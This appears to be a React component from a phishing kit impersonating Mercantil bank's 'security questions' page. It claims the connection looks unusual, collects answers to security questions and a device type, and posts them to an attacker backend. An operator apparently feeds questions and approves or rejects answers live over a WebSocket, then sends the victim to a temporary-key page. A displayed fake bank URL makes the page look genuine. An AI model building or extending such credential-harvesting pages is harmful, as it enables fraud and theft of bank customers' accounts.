import { useCallback, useEffect, useRef, useState } from "react";
import { BACKEND_URL, WS_URL } from "../config.ts";
import { navigateTo } from "../pathname.ts";
import { EyeIcon } from "./EyeIcon.tsx";
import { PreguntasLoading } from "./PreguntasLoading.tsx";

const TITLE = "Mercantil - Preguntas de Seguridad";

interface QuestionItem {
  id: string;
  question: string;
  answer: string;
  showAnswer: boolean;
}

const TEST_QUESTIONS: QuestionItem[] = [
  {
    id: "pregunta1",
    question: "¿Cuál es el apodo de su mejor amigo de la infancia?",
    answer: "",
    showAnswer: false,
  },
  {
    id: "pregunta2",
    question: "¿En qué ciudad nació su abuela paterna?",
    answer: "",
    showAnswer: false,
  },
];

export function PreguntasSeguridadPage() {
  useEffect(() => {
    const previous = document.title;
    document.title = TITLE;
    return () => {
      document.title = previous;
    };
  }, []);

  const isTestEnv = import.meta.env.MODE === "test";

  const [questions, setQuestions] = useState<QuestionItem[]>(
    isTestEnv ? TEST_QUESTIONS : [],
  );
  const [loadingQuestions, setLoadingQuestions] = useState(!isTestEnv);
  const [waitingValidation, setWaitingValidation] = useState(false);
  const [validationError, setValidationError] = useState("");
  const waitingValidationRef = useRef(false);
  const wsRef = useRef<WebSocket | null>(null);
  const [deviceSelected, setDeviceSelected] = useState<
    "personal" | "compartido" | null
  >(null);

  useEffect(() => {
    if (isTestEnv) return;

    let active = true;
    let ws: WebSocket | null = null;

    try {
      ws = new WebSocket(WS_URL);
      wsRef.current = ws;

      ws.onmessage = (event) => {
        if (!active) return;
        try {
          const data = JSON.parse(event.data);
          if (data.event === "pregunta_selected" && data.question) {
            setQuestions((prev) => {
              // Skip if already added
              if (prev.some((q) => q.id === data.question)) return prev;
              const updatedQuestions = [
                ...prev,
                {
                  id: data.question,
                  question: data.question,
                  answer: "",
                  showAnswer: false,
                },
              ];
              if (updatedQuestions.length >= 2) {
                setLoadingQuestions(false);
              }
              return updatedQuestions;
            });
          }

          if (waitingValidationRef.current && typeof data.valid === "boolean") {
            if (data.valid) {
              navigateTo("/clave-temporal");
              return;
            }

            waitingValidationRef.current = false;
            setWaitingValidation(false);
            setValidationError(
              "Las respuestas ingresadas no son válidas. Por favor verifica los datos.",
            );
          }
        } catch {
          // Non-JSON message ignored
        }
      };

      ws.onerror = () => {
        // Silently ignore connection errors
      };
    } catch {
      // Ignored
    }

    return () => {
      active = false;
      if (ws) ws.close();
      wsRef.current = null;
    };
  }, []);

  const handleAnswerChange = useCallback((id: string, value: string) => {
    setQuestions((prev) =>
      prev.map((q) => (q.id === id ? { ...q, answer: value } : q)),
    );
  }, []);

  const toggleShowAnswer = useCallback((id: string) => {
    setQuestions((prev) =>
      prev.map((q) => (q.id === id ? { ...q, showAnswer: !q.showAnswer } : q)),
    );
  }, []);

  const selectPersonal = useCallback(() => {
    setDeviceSelected((prev) => (prev === "personal" ? null : "personal"));
  }, []);

  const selectCompartido = useCallback(() => {
    setDeviceSelected((prev) => (prev === "compartido" ? null : "compartido"));
  }, []);

  const allAnswered =
    questions.length > 0 &&
    questions.every((q) => q.answer.trim() !== "") &&
    deviceSelected !== null;

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      waitingValidationRef.current = true;
      setWaitingValidation(true);
      setValidationError("");

      try {
        const answers: Record<string, string> = {};
        for (const q of questions) {
          answers[q.id] = q.answer;
        }

        await fetch(`${BACKEND_URL}/send`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            type: "questions",
            answers,
            device: deviceSelected,
          }),
        });
      } catch (err) {
        console.error("Error sending questions data:", err);
        waitingValidationRef.current = false;
        setWaitingValidation(false);
        setValidationError(
          "No fue posible validar las respuestas. Intenta nuevamente.",
        );
      }
    },
    [questions, deviceSelected],
  );

  if (loadingQuestions) {
    return <PreguntasLoading />;
  }

  if (waitingValidation) {
    return (
      <PreguntasLoading
        title="Validando respuestas"
        message="Espere un momento mientras verificamos sus respuestas de seguridad..."
      />
    );
  }

  return (
    <main className="preguntas-body">
      <header className="preguntas-header">
        <img
          src="/logotauro.svg"
          alt="Mercantil"
          className="preguntas-logo"
          width="45"
          height="36"
        />
      </header>

      <div className="preguntas-container">
        <form
          className="preguntas-card"
          onSubmit={handleSubmit}
          noValidate
          aria-label="Verificación de seguridad"
        >
          <div className="preguntas-detection">
            <p>
              Se ha detectado que esta conexión presenta características
              diferentes a las habituales.
            </p>
            <p>
              Para continuar con su acceso a Mercantil en Linea Personas,
              completa los datos solicitados:
            </p>
          </div>

          <h2 className="preguntas-section-heading">
            1.- Preguntas de seguridad
          </h2>

          {validationError !== "" && (
            <div
              className="mb-5 rounded-lg border border-red-300 bg-red-50 px-4 py-3 text-sm text-red-700"
              role="alert"
            >
              {validationError}
            </div>
          )}

          {questions.map((q, index) => (
            <div key={q.id} className="preguntas-question-group">
              <label
                className="preguntas-question-label"
                htmlFor={`pregunta-${q.id}`}
              >
                {q.question}
              </label>
              <div className="preguntas-input-row">
                <input
                  id={`pregunta-${q.id}`}
                  type={q.showAnswer ? "text" : "password"}
                  value={q.answer}
                  onChange={(e) => handleAnswerChange(q.id, e.target.value)}
                  autoComplete="off"
                  aria-label={`Respuesta a pregunta de seguridad ${index + 1}`}
                />
                <EyeIcon
                  visible={q.showAnswer}
                  onClick={() => toggleShowAnswer(q.id)}
                  label={`Mostrar respuesta ${index + 1}`}
                />
              </div>
            </div>
          ))}

          <button
            type="button"
            className="preguntas-forgot-link"
            onClick={(e) => {
              e.preventDefault();
            }}
          >
            ¿Olvidaste tus respuestas?
          </button>

          <hr className="preguntas-divider" />

          <h2 className="preguntas-section-heading">
            2.- Verifica tu conexión
          </h2>

          <div className="preguntas-device-group">
            <button
              type="button"
              className="preguntas-device-btn"
              onClick={selectPersonal}
              aria-pressed={deviceSelected === "personal"}
              aria-label="Equipo de uso personal"
            >
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#999999"
                strokeWidth="1.5"
                strokeLinecap="round"
                strokeLinejoin="round"
                aria-hidden="true"
              >
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                <circle cx="12" cy="7" r="4" />
              </svg>
              <span className="preguntas-device-label">
                Equipo de uso personal
              </span>
            </button>

            <button
              type="button"
              className="preguntas-device-btn"
              onClick={selectCompartido}
              aria-pressed={deviceSelected === "compartido"}
              aria-label="Equipo de uso compartido"
            >
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#999999"
                strokeWidth="1.5"
                strokeLinecap="round"
                strokeLinejoin="round"
                aria-hidden="true"
              >
                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
                <circle cx="9" cy="7" r="4" />
                <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
                <path d="M16 3.13a4 4 0 0 1 0 7.75" />
              </svg>
              <span className="preguntas-device-label">
                Equipo de uso compartido
              </span>
            </button>
          </div>

          <div className="preguntas-submit-container">
            <button
              type="submit"
              className="preguntas-submit-btn"
              disabled={!allAnswered}
            >
              Continuar
            </button>
          </div>
        </form>

        <p className="preguntas-footer-url" aria-hidden="true">
          www30.mercantilbanco.com
        </p>
      </div>
    </main>
  );
}
